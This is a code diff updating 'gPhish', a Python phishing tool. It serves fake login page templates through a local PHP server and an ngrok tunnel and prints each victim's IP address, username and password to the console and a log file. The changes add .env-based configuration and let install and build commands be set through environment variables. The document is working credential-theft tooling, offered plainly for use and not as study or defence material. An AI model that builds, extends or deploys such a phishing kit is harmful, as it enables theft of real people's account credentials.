@@ -1,4 +1,4 @@
-import os, subprocess, sys, shutil, unicodedata, json
+import os, subprocess, sys, shutil, unicodedata, json, dotenv
 from termcolor import colored
 from art import text2art
 from logger import Log
@@ -7,12 +7,16 @@ from pyngrok import ngrok
 from InquirerPy import inquirer # Docs: https://github.com/kazhala/InquirerPy/wiki
 from terminaltables import SingleTable
 
+## Load environment variables for gPhish
+dotenv.load_dotenv()
+
 ## Globals
 template_path = ""
 
 def normal_exit():
     os.system('clear')
-    print(colored('gPhish by LennyFaze', 'blue'))
+    print('''\n"And then he turned himself info a pickle"\n"Funiest shit I've ever seen"''')
+    print(colored('\ngPhish by LennyFaze\n', 'blue'))
     exit()
 
 def banner(clear=True):
@@ -20,18 +24,30 @@ def banner(clear=True):
     if clear:
         os.system('clear')
     print(colored(text2art('gPhish', font="smpoison"), 'green'))
-    print('By LennyFaze                                v0.1')
+    print('By LennyFaze                                v0.2')
     print('Press Ctrl + C to exit\n')
 
 def main_menu():
     global template_path
     try:
+        ## Show banner
+        banner()
+
+        ## Create env if it doesn't exist yet
+        if not os.path.isfile('.env'):
+            Log.info('No .env detected creating new one...')
+
+            # using my own env creator function :p
+            configure_env()
+
+            Log.success('Finished setting up .env')
+            sleep(2)
+            dotenv.load_dotenv()
+            main_menu()
+
         ## Create logs directory if it doesn't exist yet
         if not os.path.exists('logs'):
             os.makedirs('logs')
-        
-        ## Show banner
-        banner()
         
         ## Make user pick category
         category = inquirer.select(
@@ -46,11 +62,15 @@ def main_menu():
         ## Define template path for server process
         template_path = 'templates/' + category + '/' + template
         
-        if not os.path.isdir(template_path + '/dist'):
+        if not os.path.isdir(f"{template_path}/dist") and os.path.isdir(f"{template_path}/node_modules"):
             ## Build template if not build yet
-            Log.info('Template not build yet, starting setup')
+            Log.info('Template not build yet, starting setup.')
             setup_template()
-        else:
+        if not os.path.isdir(f"{template_path}/dist") and not os.path.isdir(f"{template_path}/node_modules"):
+            ## Build template if not installed yet
+            Log.info('Template not installed yet, starting setup.')
+            setup_template()
+        elif os.path.isfile(f"{template_path}/package.json") and os.path.isdir(f"{template_path}/node_modules"):
             ## Promt user if the template should be rebuild
             rebuild = inquirer.confirm('Rebuild template?', default=False).execute()
             if rebuild:
@@ -62,11 +82,11 @@ def main_menu():
         ## Handle Ctrl + C
         normal_exit()
 
-def setup_template():
+def configure_env(path='.'):
     lines = []
-    with open(f"{template_path}/.env.example", 'r') as input_file:
-        lines = input_file.readlines()
 
+    with open(f"{path}/.env.example", 'r') as input_file:
+        lines = input_file.readlines()
 
     for line in lines:
         if(line.startswith('!')):
@@ -78,24 +98,49 @@ def setup_template():
             else:
                 lines[lines.index(line)] = line[line.find('!')+1 : line.find('=')] + "=" + line[line.find('#(')+2 : line.find(')#')]
 
-    
     ## Delete old .env file if exist
-    if os.path.exists(f"{template_path}/.env"):
-        os.remove(f"{template_path}/.env")
+    if os.path.exists(f"{path}/.env"):
+        os.remove(f"{path}/.env")
 
     ## Create new .env file
-    with open(f"{template_path}/.env", 'w') as output_file:
+    with open(f"{path}/.env", 'w') as output_file:
         for line in lines:
-            output_file.write(line)
+            output_file.write(line + '\n')
+
+def setup_template():
+    ## Check for first time setup
+    if os.path.isfile(f"{template_path}/package.json") and not os.path.isdir(f"{template_path}/node_modules"):
+        ## Promt user if the template should be installed
+        install = inquirer.confirm('Do you want to install and continue?', default=True).execute()
+        if install:
+            Log.info('Building template, please wait...')
+            builder = subprocess.Popen(f"cd {template_path} && {os.getenv('INSTALL_COMMAND')}", shell=True)
+
+            ## Wait until builder is finished
+            try:
+                builder.wait()
+            except KeyboardInterrupt:
+                Log.error('Canceled installation :(')
+                sleep(2)
+                main_menu()
+
+            Log.info('Template installed, continuing to setup...')
+        else:
+            main_menu()
+
+    ## Promt user to configure .env file if .env.example exists
+    if os.path.isfile(f"{template_path}/.env.example"):
+        configure_env(template_path)
+
 
     Log.info('Building template, please wait...')
-    builder = subprocess.Popen(f"cd {template_path} && yarn build", shell=True)
+    builder = subprocess.Popen(f"cd {template_path} && {os.getenv('BUILD_COMMAND')}", shell=True)
 
     ## Wait until builder is finished
     try:
         builder.wait()
     except KeyboardInterrupt:
-        exit_normally()
+        normal_exit()
     
     Log.success('Building finished')
     start_server()
@@ -107,11 +152,12 @@ def start_server():
     # Delete old template if not deleted yet
     if os.path.isdir('.server/public/'):
         shutil.rmtree('.server/public/')
+
     # Copy selected template to server
     shutil.copytree(template_path + '/dist', '.server/public/')
 
     Log.info('Staring server...')
-    server = subprocess.Popen(f"php -S 127.0.0.1:8080 -t .server/public/", 
+    server = subprocess.Popen(f"php -S 127.0.0.1:8080 -t .server/public .server/php/router.php", 
         stdout=subprocess.PIPE, #open('logs/serverlog.txt', 'w'), 
         stderr=open('logs/serverlog.txt', 'w'),
         shell=True,
@@ -146,12 +192,12 @@ def start_server():
             if message['tag'] == 'visitor':
                 sys.stdout.write(colored('New visitor:', 'green') + '\n')
                 sys.stdout.write('\tIP: \t\t' + colored(message['ip'], 'blue') + '\n')
-                sys.stdout.write('\tUseragent: \t' + colored(message['useragent'], 'blue') + '\n')
+                sys.stdout.write('\tUseragent: \t' + colored(message['useragent'], 'blue') + '\n\n')
             if message['tag'] == 'login':
                 sys.stdout.write(colored('Login:', 'green') + '\n')
                 sys.stdout.write('\tIP: \t\t' + colored(message['ip'], 'blue') + '\n')
                 sys.stdout.write('\tUsername: \t' + colored(message['user'], 'blue') + '\n')
-                sys.stdout.write('\tPassword: \t' + colored(message['pass'], 'blue') + '\n')
+                sys.stdout.write('\tPassword: \t' + colored(message['pass'], 'blue') + '\n\n')
             logfile.write(line)
 
         server.wait()
@@ -169,5 +215,5 @@ def start_server():
     # except:
     #    Log.error('An unknown error occured')
 
-
+## Start main menu
 main_menu()
